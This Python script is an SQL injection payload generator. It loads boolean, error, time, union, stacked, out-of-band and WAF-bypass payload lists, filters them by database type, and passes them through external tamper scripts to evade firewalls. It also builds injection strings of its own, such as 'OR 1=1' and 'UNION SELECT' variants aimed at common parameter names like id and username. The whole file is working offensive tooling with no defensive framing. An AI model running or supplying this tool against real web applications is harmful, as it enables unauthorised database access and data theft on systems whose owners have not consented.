#!/usr/bin/env python3
# Advanced SQL Injection Payload Generator
# Generates targeted payloads based on database type and WAF detection

import sys
import os
import json
import re
import random
import urllib.parse
from collections import defaultdict

# Initialize database-specific payload directories
PAYLOAD_DIR = "Payloads"
DB_TYPES = ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "Generic"]

class SQLiPayloadGenerator:
    def __init__(self):
        self.payloads = defaultdict(list)
        self.load_payloads()
        
    def load_payloads(self):
        """Load payloads from files in the Payloads directory"""
        payload_files = {
            "Boolean": "Boolean_Based_SQLi_Payloads.txt",
            "Error": "Error_Based_SQLi_Payloads.txt", 
            "Time": "Time_Based_SQLi_Payloads.txt",
            "Union": "Union_Based_SQLi_Payloads.txt",
            "Stacked": "Stacked_Queries_SQLi_Payloads.txt",
            "WAF": "WAF_Bypass_SQLi_Payloads.txt",
            "OOB": "OOB_SQLi_Payloads.txt",
            "Hybrid": "Hybrid_SQLi_Payloads.txt"
        }
        
        # Load each type of payload
        for payload_type, filename in payload_files.items():
            file_path = os.path.join(PAYLOAD_DIR, filename)
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    lines = f.readlines()
                    # Skip comments and empty lines
                    self.payloads[payload_type] = [line.strip() for line in lines 
                                                  if line.strip() and not line.strip().startswith('#')]
                                                  
    def generate_for_db(self, db_type, technique=None, count=10):
        """Generate database-specific payloads"""
        payloads = []
        
        # Normalize DB type
        db_type = db_type.lower()
        
        # Select appropriate techniques if not specified
        if not technique:
            techniques = list(self.payloads.keys())
        else:
            techniques = [technique]
            
        for technique in techniques:
            if technique not in self.payloads or not self.payloads[technique]:
                continue
                
            # Get payloads for this technique
            technique_payloads = self.payloads[technique]
            
            # Filter payloads by database type if needed
            if db_type != "generic":
                # For DB-specific payloads
                filtered_payloads = [p for p in technique_payloads if self._is_for_db(p, db_type)]
                
                # If we don't have enough DB-specific payloads, add some generic ones
                if len(filtered_payloads) < count:
                    generic_payloads = [p for p in technique_payloads if not any(self._is_for_db(p, db) for db in DB_TYPES)]
                    filtered_payloads.extend(generic_payloads)
                    
                technique_payloads = filtered_payloads
            
            # Select random payloads from this technique
            selected = random.sample(technique_payloads, min(count, len(technique_payloads)))
            payloads.extend(selected)
        
        # Make sure we return at most 'count' payloads in total
        if len(payloads) > count:
            payloads = random.sample(payloads, count)
            
        return payloads
        
    def _is_for_db(self, payload, db_type):
        """Check if a payload is designed for a specific database"""
        db_indicators = {
            "mysql": ["/*!", "mysql", "information_schema", "sleep(", "benchmark("],
            "postgresql": ["pg_", "postgresql", "postgres", "pg_sleep"],
            "mssql": ["@@version", "waitfor delay", "mssql", "sql server", "len("],
            "oracle": ["from dual", "oracle", "sys."],
            "sqlite": ["sqlite", "sqlite_"]
        }
        
        # Check if payload contains any of the indicators for the given DB
        indicators = db_indicators.get(db_type.lower(), [])
        return any(ind.lower() in payload.lower() for ind in indicators)
        
    def apply_tamper(self, payload, tamper_techniques):
        """Apply tamper techniques to a payload using external tamper scripts"""
        tampered = payload
        
        if not tamper_techniques:
            return tampered
            
        # Split tamper techniques by comma
        techniques = tamper_techniques.split(',')
        
        for technique in techniques:
            technique = technique.strip()
            if not technique:
                continue
                
            # Check if tamper script exists
            tamper_script = f"tamper/{technique}.py"
            if not os.path.exists(tamper_script):
                continue
                
            try:
                # Apply the tamper script using pipe
                import subprocess
                result = subprocess.run(['python3', tamper_script], 
                                       input=tampered.encode(), 
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.DEVNULL)
                if result.returncode == 0:
                    tampered = result.stdout.decode().strip()
            except Exception as e:
                print(f"Error applying tamper {technique}: {e}")
                
        return tampered
        
    def generate_smart_payloads(self, db_type, tamper_techniques=None, count=10):
        """Generate smart tampered payloads for a specific database"""
        payloads = self.generate_for_db(db_type, count=count)
        
        if tamper_techniques:
            tampered_payloads = [self.apply_tamper(p, tamper_techniques) for p in payloads]
            return tampered_payloads
        else:
            return payloads
            
    def create_specialized_payloads(self, db_type, url_param, waf_type=None):
        """Create specialized payloads for a specific context"""
        specialized = []
        
        # Add some context-aware payloads
        if url_param.lower() in ['id', 'user_id', 'product_id']:
            # Likely numeric parameter
            specialized.append(f"{url_param}=-1 UNION SELECT 1,2,3")
            specialized.append(f"{url_param}=1 OR 1=1")
            
        elif url_param.lower() in ['username', 'user', 'name', 'email']:
            # Likely string parameter
            specialized.append(f"{url_param}=' OR '1'='1")
            specialized.append(f"{url_param}=' UNION SELECT 1,2,3 -- -")
            
        # Generate DB-specific payloads
        db_payloads = self.generate_for_db(db_type, count=5)
        specialized.extend(db_payloads)
        
        # Apply WAF bypass techniques if specified
        if waf_type:
            # Get appropriate tamper for this WAF
            from waf_identify import get_recommended_tampers
            tamper_techniques = get_recommended_tampers(waf_type)
            
            # Apply tamper to all payloads
            specialized = [self.apply_tamper(p, tamper_techniques) for p in specialized]
            
        return specialized

    def save_custom_payloads(self, db_type, payloads, output_file=None):
        """Save generated payloads to a file"""
        if not output_file:
            output_file = f"{PAYLOAD_DIR}/Custom_{db_type}_Payloads.txt"
            
        with open(output_file, 'w') as f:
            f.write(f"# Custom payloads for {db_type}\n")
            f.write(f"# Generated on {os.popen('date').read().strip()}\n")
            f.write("\n".join(payloads))
            
        return output_file

if __name__ == "__main__":
    # Simple command-line interface
    if len(sys.argv) < 2:
        print("Usage: python3 payload_generator.py <db_type> [tamper_techniques] [count]")
        sys.exit(1)
        
    db_type = sys.argv[1]
    tamper = sys.argv[2] if len(sys.argv) > 2 else None
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    
    generator = SQLiPayloadGenerator()
    payloads = generator.generate_smart_payloads(db_type, tamper, count)
    
    print(f"Generated {len(payloads)} payloads for {db_type}:")
    for p in payloads:
        print(f"- {p}")
